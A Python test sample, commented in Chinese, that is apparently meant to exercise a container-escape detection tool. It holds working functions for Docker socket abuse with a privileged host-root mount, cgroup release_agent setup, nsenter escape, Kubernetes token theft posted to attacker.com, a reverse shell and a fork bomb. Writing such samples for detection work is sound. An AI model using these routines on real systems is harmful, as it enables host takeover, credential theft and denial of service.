#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
测试示例：包含多种容器逃逸特征的Python代码
用于测试容器逃逸特征提取工具
"""

import os
import subprocess
import socket
import requests
import ctypes

# ========== 侦察阶段 ==========

# 1. 容器环境指纹探测
def check_container_env():
    """检测是否在容器中运行"""
    if os.path.exists('/.dockerenv'):
        print("运行在Docker容器中")
    
    with open('/proc/1/cgroup', 'r') as f:
        cgroup_info = f.read()
        if 'docker' in cgroup_info or 'kubepods' in cgroup_info:
            print("检测到容器环境")

# 2. 云元数据服务探测
def probe_cloud_metadata():
    """尝试访问云厂商元数据服务"""
    try:
        # AWS元数据服务
        response = requests.get('http://169.254.169.254/latest/meta-data/', timeout=2)
        if response.status_code == 200:
            print("发现AWS元数据服务")
    except:
        pass

# 3. K8s API探测
def probe_k8s_api():
    """探测Kubernetes API"""
    k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST')
    if k8s_host:
        print(f"发现K8s API: {k8s_host}")

# ========== 逃逸阶段 ==========

# 4. Docker Socket滥用
def exploit_docker_socket():
    """利用Docker Socket创建特权容器"""
    if os.path.exists('/var/run/docker.sock'):
        # 创建特权容器并挂载宿主机根目录
        cmd = 'docker run -it --privileged -v /:/host alpine /bin/sh'
        os.system(cmd)

# 5. Cgroup Release Agent逃逸
def exploit_cgroup_release_agent():
    """利用Cgroup Release Agent逃逸"""
    # 挂载cgroup
    os.system('mount -t cgroup -o memory cgroup /tmp/cgroup')
    
    # 设置release_agent
    with open('/tmp/cgroup/release_agent', 'w') as f:
        f.write('/tmp/escape.sh')
    
    # 开启notify_on_release
    with open('/tmp/cgroup/notify_on_release', 'w') as f:
        f.write('1')

# 6. 使用ctypes调用系统调用
def exploit_with_ctypes():
    """使用ctypes直接调用libc函数"""
    libc = ctypes.CDLL('libc.so.6')
    
    # 调用setns切换命名空间
    # libc.setns(fd, 0)
    
    # 调用mount挂载文件系统
    # libc.mount(source, target, fstype, flags, data)

# 7. nsenter逃逸
def exploit_nsenter():
    """使用nsenter进入宿主机命名空间"""
    subprocess.call(['nsenter', '-t', '1', '-a', '/bin/bash'])

# ========== 持久化阶段 ==========

# 8. 窃取K8s Service Account Token
def steal_k8s_token():
    """窃取Kubernetes凭证"""
    token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
    if os.path.exists(token_path):
        with open(token_path, 'r') as f:
            token = f.read()
            # 外发token
            requests.post('http://attacker.com/collect', data={'token': token})

# 9. 反弹Shell
def reverse_shell(host, port):
    """建立反弹Shell连接"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # 重定向标准输入输出
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # 启动Shell
    subprocess.call(['/bin/bash', '-i'])

# ========== DoS攻击 ==========

# 10. Fork Bomb
def fork_bomb():
    """进程耗尽攻击"""
    while True:
        os.fork()

if __name__ == '__main__':
    # 执行侦察
    check_container_env()
    probe_cloud_metadata()
    probe_k8s_api()
